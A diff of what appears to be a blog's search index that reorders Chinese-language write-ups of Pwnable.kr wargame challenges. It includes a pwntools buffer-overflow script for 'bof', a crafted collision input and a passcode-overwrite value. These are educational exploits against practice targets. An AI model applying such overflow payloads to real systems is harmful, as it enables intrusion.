@@ -1,23 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>bof</title>
-    <url>/xiaohong404.github.io/2020/10/15/bof/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/bof/4.png" class></strong></p>
- <a id="more"></a>
-
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/bof/1.png" class></strong></p>
-<h3 id="查看给出的c语言源代码"><a href="#查看给出的c语言源代码" class="headerlink" title="查看给出的c语言源代码"></a>查看给出的c语言源代码</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/bof/2.png" class></strong></p>
-<p>显然，简单的缓冲区溢出，将key通过缓冲区溢出覆盖为0xcafebabe，即可通过判断条件，执行system函数。</p>
-<h3 id="IDA32打开文件"><a href="#IDA32打开文件" class="headerlink" title="IDA32打开文件"></a>IDA32打开文件</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/bof/3.png" class></strong></p>
-<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>,<span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x2C</span> + <span class="string">&#x27;junk&#x27;</span> + <span class="string">&#x27;junk&#x27;</span> + p32(<span class="number">0xcafebabe</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <tags>
-        <tag>Pwnable.kr</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>collision</title>
     <url>/xiaohong404.github.io/2020/10/15/collision/</url>
     <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/collision/1.png" class></strong></p>
@@ -42,6 +25,23 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">./col $(python -c <span class="string">&quot;print &#x27;\x01\x01\x01\x01&#x27;*4 + &#x27;\xe8\x05\xd9\x1d&#x27;&quot;</span>)</span><br><span class="line"><span class="comment"># 这一inline的python表达式可以将生成的结果作为argv[1]参数</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="拿到flag"><a href="#拿到flag" class="headerlink" title="拿到flag"></a>拿到flag</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/collision/8.png" class></strong></p>
+]]></content>
+      <tags>
+        <tag>Pwnable.kr</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>bof</title>
+    <url>/xiaohong404.github.io/2020/10/15/bof/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/bof/4.png" class></strong></p>
+ <a id="more"></a>
+
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/bof/1.png" class></strong></p>
+<h3 id="查看给出的c语言源代码"><a href="#查看给出的c语言源代码" class="headerlink" title="查看给出的c语言源代码"></a>查看给出的c语言源代码</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/bof/2.png" class></strong></p>
+<p>显然，简单的缓冲区溢出，将key通过缓冲区溢出覆盖为0xcafebabe，即可通过判断条件，执行system函数。</p>
+<h3 id="IDA32打开文件"><a href="#IDA32打开文件" class="headerlink" title="IDA32打开文件"></a>IDA32打开文件</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/bof/3.png" class></strong></p>
+<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>,<span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x2C</span> + <span class="string">&#x27;junk&#x27;</span> + <span class="string">&#x27;junk&#x27;</span> + p32(<span class="number">0xcafebabe</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <tags>
         <tag>Pwnable.kr</tag>
@@ -78,23 +78,6 @@
       </tags>
   </entry>
   <entry>
-    <title>flag</title>
-    <url>/xiaohong404.github.io/2020/10/15/flag/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/flag/1.png" class></strong></p>
- <a id="more"></a>
-
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/flag/2.png" class></strong></p>
-<h3 id="checksec查看文件属性"><a href="#checksec查看文件属性" class="headerlink" title="checksec查看文件属性"></a>checksec查看文件属性</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/flag/3.png" class></strong></p>
-<h3 id="windows下使用upx-d命令解压缩"><a href="#windows下使用upx-d命令解压缩" class="headerlink" title="windows下使用upx -d命令解压缩"></a>windows下使用upx -d命令解压缩</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/flag/4.png" class></strong></p>
-<h3 id="IDA64打开解压缩的文件"><a href="#IDA64打开解压缩的文件" class="headerlink" title="IDA64打开解压缩的文件"></a>IDA64打开解压缩的文件</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/flag/5.png" class></strong></p>
-<p>将flag的值存放到dest中，直接查看flag即可</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/flag/6.png" class></strong></p>
-]]></content>
-      <tags>
-        <tag>Pwnable.kr</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>passcode</title>
     <url>/xiaohong404.github.io/2020/10/15/passcode/</url>
     <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/passcode/11.png" class></strong></p>
@@ -121,6 +104,23 @@
 
 <p>因为passcode是输入int型，即输入$0x080485e3 = 134514147$。</p>
 <h3 id="获得flag"><a href="#获得flag" class="headerlink" title="获得flag"></a>获得flag</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/passcode/10.png" class></strong></p>
+]]></content>
+      <tags>
+        <tag>Pwnable.kr</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>flag</title>
+    <url>/xiaohong404.github.io/2020/10/15/flag/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/flag/1.png" class></strong></p>
+ <a id="more"></a>
+
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/flag/2.png" class></strong></p>
+<h3 id="checksec查看文件属性"><a href="#checksec查看文件属性" class="headerlink" title="checksec查看文件属性"></a>checksec查看文件属性</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/flag/3.png" class></strong></p>
+<h3 id="windows下使用upx-d命令解压缩"><a href="#windows下使用upx-d命令解压缩" class="headerlink" title="windows下使用upx -d命令解压缩"></a>windows下使用upx -d命令解压缩</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/flag/4.png" class></strong></p>
+<h3 id="IDA64打开解压缩的文件"><a href="#IDA64打开解压缩的文件" class="headerlink" title="IDA64打开解压缩的文件"></a>IDA64打开解压缩的文件</h3><p><strong><img src="/xiaohong404.github.io/2020/10/15/flag/5.png" class></strong></p>
+<p>将flag的值存放到dest中，直接查看flag即可</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/flag/6.png" class></strong></p>
 ]]></content>
       <tags>
         <tag>Pwnable.kr</tag>
